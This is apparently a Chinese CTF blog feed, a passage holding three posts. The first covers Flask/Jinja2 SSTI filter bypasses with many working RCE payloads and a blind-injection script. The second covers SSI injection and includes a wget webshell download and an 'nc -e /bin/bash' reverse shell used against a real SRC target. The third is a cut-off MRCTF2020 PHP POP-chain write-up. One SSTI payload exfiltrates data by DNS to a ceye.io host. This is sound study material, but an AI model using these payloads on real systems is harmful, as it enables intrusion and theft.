None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre><p><strong>过滤中括号</strong></p><p>过滤了[和]</p><ul><li>数字中的中括号</li></ul><p>在python里面可以使用以下方法访问数组元素</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>Python 3.7.8&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].pop(1)&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)&#39;kawhi&#39;</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><p>也就是说可以使用__getitem__和pop替代中括号，取列表的第n位</p><p>payload如下</p><pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125;&#125;</code></pre><ul><li>魔术方法的中括号</li></ul><p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p><p>可用__getattribute__绕过</p><pre><code>&#123;&#123;"".__getattribute__("__cla"+"ss__").__base__&#125;&#125;</code></pre><p>或者可以配合request一起使用</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</code></pre><p>payload如下</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</code></pre><p>这种同样是绕过关键字的方法之一</p><p><strong>过滤双大括号</strong></p><p>过滤了</p><ul><li>使用dns外带数据</li></ul><pre><code class="python">用&#123;%%&#125;替代了&#123;&#123;&#125;&#125;，使用判断语句进行dns外带数据``````&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %&#125;1&#123;% endif %&#125;```然后在ceye平台接收数据即可![img](ssti-flak框架/a0b1acecc5844f778d857c94da232d74.jpeg)- 盲注如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```# -*- coding: utf-8 -*-import requestsurl = 'http://ip:5000/?name='def check(payload):    r = requests.get(url+payload).content    return 'kawhi' in rpassword  = ''s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`&#123;|&#125;~\'"_%'for i in xrange(0,100):    for c in s:        payload = '&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %&#125;kawhi&#123;% endif %&#125;'        if check(payload):            password += c            break    print password```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)- print标记我们上面之所以要dnslog外带数据以及使用盲注，是因为用&#123;%%&#125;会没有回显，这里的话可以使用print来做一个标记使得他有回显，比如&#123;%print config%&#125;，payload如下```&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%&#125;```**payload进阶与拓展**这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展**过滤_和.和'**这里顺便给一个不常见的方法，主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下```&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")&#125;&#125;```使用十六进制绕过后，payload如下```&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")&#125;&#125;```**过滤args和.和_**之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```&#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)**导入主函数读取变量**有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把/flag文件加载到flag这个变量里面了```f = open('/flag','r')flag = f.read()```我们就可以通过import是导入__main__主函数去读变量，payload如下```&#123;%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %&#125;</=></code></pre><p><strong>Unicode绕过</strong></p><p>这种方法是从安洵杯2020 官方Writeup学到的，我们直奔主题看payload</p><pre><code>&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</code></pre><pre><code>这里的print绕过&#123;&#123;&#125;&#125;和attr绕过.上面已经说过了这里不赘述然后这里的lipsum用&#123;&#123;lipsum&#125;&#125;测了一下发现是个方法&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</code></pre><p>然后用他直接调用__globals__发现可以直接执行os命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们tql</p><pre><code>&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;</code></pre><p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p><pre><code>&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;</code></pre><p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p><pre><code>&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;</code></pre><p>然后我这里顺便给个Unicode互转的php脚本</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><pre><code>&lt;?php//字符串转Unicode编码function unicode_encode($strLong) &#123;  $strArr = preg_split(&#39;/(?&lt;!^)(?!$)/u&#39;, $strLong);//拆分字符串为数组(含中文字符)  $resUnicode = &#39;&#39;;  foreach ($strArr as $str)  &#123;      $bin_str = &#39;&#39;;      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)      foreach ($arr as $value)      &#123;          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;      &#125;      $bin_str = preg_replace(&#39;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#39;, &#39;$1$2$3&#39;, $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;      $unicode = dechex(bindec($bin_str));//返回unicode十六进制      $_sup = &#39;&#39;;      for ($i = 0; $i &lt; 4 - strlen($unicode); $i++)      &#123;          $_sup .= &#39;0&#39;;//补位高字节 0      &#125;      $str =  &#39;\\u&#39; . $_sup . $unicode; //加上 \u  返回      $resUnicode .= $str;  &#125;  return $resUnicode;&#125;//Unicode编码转字符串方法1function unicode_decode($name)&#123;  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码  $pattern = &#39;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#39;;  preg_match_all($pattern, $name, $matches);  if (!empty($matches))  &#123;    $name = &#39;&#39;;    for ($j = 0; $j &lt; count($matches[0]); $j++)    &#123;      $str = $matches[0][$j];      if (strpos($str, &#39;\\u&#39;) === 0)      &#123;        $code = base_convert(substr($str, 2, 2), 16, 10);        $code2 = base_convert(substr($str, 4), 16, 10);        $c = chr($code).chr($code2);        $c = iconv(&#39;UCS-2&#39;, &#39;UTF-8&#39;, $c);        $name .= $c;      &#125;      else      &#123;        $name .= $str;      &#125;    &#125;  &#125;  return $name;&#125;//Unicode编码转字符串function unicode_decode2($str)&#123;  $json = &#39;&#123;&quot;str&quot;:&quot;&#39; . $str . &#39;&quot;&#125;&#39;;  $arr = json_decode($json, true);  if (empty($arr)) return &#39;&#39;;  return $arr[&#39;str&#39;];&#125;echo unicode_encode(&#39;__class__&#39;);echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p><h1 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a><strong>魔改字符</strong></h1><pre><code>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改&#123;&#123;&#125;&#125;，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法```![img](ssti-flak框架/99b07c77bc934233b53852378b18075d.jpeg)可以在Unicode字符网站寻找绕过的字符，直接在网址搜索&#123;，就会出现类似的字符，就可以找到︷和︸了，网址：https://www.compart.com/en/unicode/U+FE38payload如下```︷︷config︸︸%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8```还可以使用中文的字符魔改[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)```｛ &#65371;｝ &#65373;［ &#65339;］ &#65341;＇ &#65287;＂ &#65282;payload如下｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 总结```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)----------做题思路：首先找到漏洞存在点。```&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;</code></pre><p>通过这个输出所有类。</p><p>在子类列表中找到可以getshell的类/记住一些常见的可以getshell的函数。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __ 是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__ builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>模板跑循环</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>读取文件payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><p>常用脚本：</p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>[<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码">](</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初始ssti漏洞&quot;&gt;&lt;a href=&quot;#初始ssti漏洞&quot; class=&quot;headerlink&quot; title=&quot;初始ssti漏洞&quot;&gt;&lt;/a&gt;初始ssti漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;SSTI(Server-Side Template Injecti</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ssi服务端包含注入</title>
    <link href="https://sakurahack-y.github.io/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/"/>
    <id>https://sakurahack-y.github.io/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-13T15:58:27.000Z</published>
    <updated>2021-10-13T16:14:08.068Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                      ssi服务端包含注入</p><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h1 id="SSI-配置和语法"><a href="#SSI-配置和语法" class="headerlink" title="SSI 配置和语法"></a>SSI 配置和语法</h1><h2 id="启用SSI"><a href="#启用SSI" class="headerlink" title="启用SSI"></a>启用SSI</h2><p>示例：Nginx 配置SSI功能</p><p>在http段中加入下面几句即可：</p><pre><code>ssi on;ssi_silent_errors off;ssi_types text/shtml;</code></pre><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来</p><pre><code class="html">①显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;**②****将文本内容直接插入到文档中&lt;#include&gt;**&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径    ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt;④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)⑥高级SSI可设置变量使用if条件语句。</code></pre><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。</p><p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：</p><ul><li>文件相关的属性字段</li><li>当前时间</li><li>访客IP</li><li>调用CGI程序</li></ul><h1 id="SSI注入的条件"><a href="#SSI注入的条件" class="headerlink" title="SSI注入的条件"></a>SSI注入的条件</h1><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p><ul><li><p>Web 服务器已支持SSI（服务器端包含）</p></li><li><p>Web 应用程序未对对相关SSI关键字做过滤</p></li><li><p>Web 应用程序在返回响应的HTML页面时，嵌入用户输入</p></li><li><p>SSI注入常用命令：</p></li><li><pre><code class="html">例子示例 1用于注入 SSI 的命令因使用的服务器操作系统而异。以下命令表示应用于执行 OS 命令的语法。Linux：列出目录下的文件：&lt;!--#exec cmd=&quot;ls&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;执行脚本：&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;视窗：列出目录下的文件：&lt;!--#exec cmd=&quot;dir&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;示例 2可用于访问和设置服务器信息的其他 SSI 示例：要更改错误消息输出：&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;显示当前文档文件名：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;显示虚拟路径和文件名：&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;使用“config”命令和“timefmt”参数，可以控制日期和时间输出格式：&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;使用“fsize”命令，可以打印所选文件的大小：&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;示例 3IIS 4.0 和 5.0 版本中的一个旧漏洞允许攻击者通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统权限。“ssinc.dll”用于解释进程服务器端包含。 CVE 2001-0506。通过创建包含以下 SSI 代码的恶意页面并强制应用程序加载此页面（路径遍历攻击），可以执行此攻击：ssi_over.shtml&lt;!--#include file=”UUUUUUUU...UU”--&gt;PS：“U”的数量需要大于2049。强制应用程序加载 ssi_over.shtml 页面：非恶意网址：www.vulnerablesite.org/index.asp?page=news.asp恶意网址：www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml如果 IIS 返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵程序流并执行任意代码。</code></pre></li></ul><h1 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h1><p>两个思路：</p><ul><li>从业务场景来Fuzz，比如获取IP、定位、时间等</li><li>识别页面是否包含.stm,.shtm和.shtml后缀</li><li><a href="https://v.duoyinsu.com/"><strong>伏特分布式漏洞扫描平台</strong></a><strong>已经全面支持SSI检测。</strong></li></ul><p>google dork：’inurl:bin/cklb’</p><h1 id="SSI漏洞复现"><a href="#SSI漏洞复现" class="headerlink" title="SSI漏洞复现"></a>SSI漏洞复现</h1><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>我们使用bWAPP来做漏洞演示环境</p><p>选择：’Server-Side Includes (SSI) Injection’</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"> </p><p>成功执行了代码。</p><pre><code>再使用下exec指令使用cmd作为参数执行服务器端命令：&#39;&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;&#39;</code></pre><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>运气好，刚好遇到个某SRC的。</p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>执行命令</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</code></pre><p>反弹shell</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="SSI防御"><a href="#SSI防御" class="headerlink" title="SSI防御"></a>SSI防御</h1><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                      ssi服务端包含注入&lt;/p&gt;
&lt;p&gt;SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="ssi" scheme="https://sakurahack-y.github.io/categories/CTF/ssi/"/>
    
    
    <category term="ssi" scheme="https://sakurahack-y.github.io/tags/ssi/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezpop</title>
    <link href="https://sakurahack-y.github.io/2021/10/13/MRCTF2020-Ezpop/"/>
    <id>https://sakurahack-y.github.io/2021/10/13/MRCTF2020-Ezpop/</id>
    <published>2021-10-12T17:05:15.000Z</published>
    <updated>2021-10-12T17:41:01.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>打开网页，代码如下：</p><pre><code>Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; </code></pre><p>下面是本题一些魔术方法的介绍：</p><pre><code>__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() 用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke() 当脚本尝试将对象调用为函数时触发。</code></pre><p>首先观察敏感函数，在Modifier中发现敏感函数include(),这应该是一个可利用点。问题的关键点就算如何调用Modifier中的include()函数。可以看到里面有一个魔术方法：__invoke(),当脚本尝试将对象调用为函数时触发，那么问题就转化为如何通过构建pop链来触发这个函数。</p><p>Show类中 __ construct并没有什么用。但我们发现了一个敏感点, __ toString魔术方法。它的作用主要就是能echo一个实例化的类（如果这个类没有 __ toString()，则会报错），因为echo时会自动调用__toString()。那么我们看如何才能调用这个魔术方法呢？</p><p>我们发现show类中还有一个过滤：</p><pre><code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code></pre><p>preg_match（）函数用到source，如果source是字符串，则直接拿来匹配。<br> 如果source是一个类且这个类里有__ toString()方法，则会调用__ toString()。</p><p>所以我们应该使source为一个类来调用__ toString 方法。</p><p>source = new Show();</p><p>调用__ toString后会返回这个：</p><pre><code> return $this-&gt;str-&gt;source;</code></pre><p>我们要考虑该如何利用这个。</p><p>如果令 $this-&gt;str = new Test(),Test()类中没有source,则会自动调用 __ get(),返回一个变量加括号，即函数 $p()。如果我们再让$p = new Modifier()。则相当于返回一个类函数，则会调用Modifier的 __invoke() ，用 $var读取flag.php即可.</p><p>payload:</p><pre><code>&lt;?phpclass Modifier &#123;    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;public function __construct($file=&#39;index.php&#39;)&#123;    